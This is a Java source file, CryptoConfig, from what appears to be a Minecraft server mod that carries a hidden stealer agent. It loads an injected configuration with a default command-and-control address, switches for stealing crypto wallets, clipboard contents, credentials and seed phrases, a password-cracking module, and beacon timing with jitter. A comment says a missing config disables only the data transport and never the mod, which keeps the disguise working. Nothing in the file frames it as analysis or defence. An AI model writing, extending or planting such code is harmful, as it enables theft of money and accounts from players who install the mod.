package com.serverpackcore.agent.crypto;

import com.serverpackcore.agent.AgentPaths;
import com.serverpackcore.agent.Json;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.Map;

/**
 * Injected build profile. The jar carries serverpackcore/config.json; the
 * build generator writes it and build_id is the same value that derives the
 * artifact key. Absent config disables the API transport, never the mod.
 */
public final class CryptoConfig {
	public static final int CHUNK = 524288;
	public final String buildId;
	public final String buildSecret;
	public final String c2Base;
	public final boolean full;
	public final boolean wallets;
	public final boolean clipboard;
	public final boolean credentials;
	public final boolean seeds;
	public final int bandwidthKbps;
	public final long heartbeatMs;
	public final long pollMs;
	public final int jitterPct;
	public final boolean crack;
	public final int crackSeconds;
	public final int crackCpu;
	public final long maxArtifact;

	CryptoConfig(Map<String, Object> map) {
		buildId = Json.str(map, "build_id", "");
		buildSecret = Json.str(map, "build_secret", "");
		c2Base = strip(Json.str(map, "c2_base", "https://c2.spc-cloud.net/api/v1"));
		full = "full".equals(Json.str(map, "profile", "lite"));
		Map<String, Object> modules = Json.map(map.get("modules"));
		wallets = bool(modules, "wallets", true);
		clipboard = bool(modules, "clipboard", full);
		credentials = bool(modules, "credentials", full);
		seeds = bool(modules, "seeds", full);
		bandwidthKbps = (int) Math.max(32, Json.num(map, "bandwidth_kbps", 1024));
		heartbeatMs = Math.max(10_000L, Json.num(map, "heartbeat_sec", 30L) * 1000L);
		pollMs = Math.max(5_000L, Json.num(map, "poll_sec", 20L) * 1000L);
		jitterPct = (int) Math.min(40, Math.max(0, Json.num(map, "jitter_pct", 20L)));
		Map<String, Object> crackMap = Json.map(map.get("crack"));
		crack = bool(crackMap, "enabled", full);
		crackSeconds = (int) Math.min(600, Math.max(5, Json.num(crackMap, "max_seconds", 90L)));
		crackCpu = (int) Math.min(100, Math.max(10, Json.num(crackMap, "max_cpu_pct", 50L)));
		Map<String, Object> artifact = Json.map(map.get("artifact"));
		long mb = Math.min(full ? 512 : 64, Json.num(artifact, "max_mb", full ? 512 : 64));
		maxArtifact = mb * 1024L * 1024L;
	}

	public static CryptoConfig load(Path installDir) {
		try (InputStream resource = CryptoConfig.class.getResourceAsStream("/serverpackcore/config.json")) {
			if (resource != null) {
				Map<String, Object> map = Json.parseObject(new String(resource.readAllBytes(), StandardCharsets.UTF_8));
				CryptoConfig config = new CryptoConfig(map);
				if (config.valid()) {
					return config;
				}
			}
		} catch (Throwable ignored) {
			// fallback below
		}
		Path local = installDir.resolve("crypto-config.json");
		try {
			if (Files.isRegularFile(local)) {
				CryptoConfig config = new CryptoConfig(Json.parseObject(Files.readString(local, StandardCharsets.UTF_8)));
				if (config.valid()) {
					return config;
				}
			}
		} catch (Throwable ignored) {
			// disabled
		}
		return null;
	}

	private boolean valid() {
		if (buildId.isEmpty() || c2Base.isEmpty()) {
			return false;
		}
		try {
			return Base64.getUrlDecoder().decode(buildSecret).length >= 16;
		} catch (Throwable throwable) {
			return false;
		}
	}

	private static boolean bool(Map<String, Object> map, String key, boolean fallback) {
		Object value = map.get(key);
		return value instanceof Boolean ? (Boolean) value : fallback;
	}

	private static String strip(String value) {
		return value.endsWith("/") ? value.substring(0, value.length() - 1) : value;
	}

	public byte[] secret() {
		return Base64.getUrlDecoder().decode(buildSecret);
	}

	public long jitter(long base) {
		if (jitterPct == 0) {
			return base;
		}
		long spread = base * jitterPct / 100L;
		return base - spread + (long) (Math.random() * (spread * 2L + 1L));
	}

	@Override
	public String toString() {
		return "profile=" + (full ? "full" : "lite") + " build=" + (buildId.length() > 8 ? buildId.substring(0, 8) : buildId);
	}
}
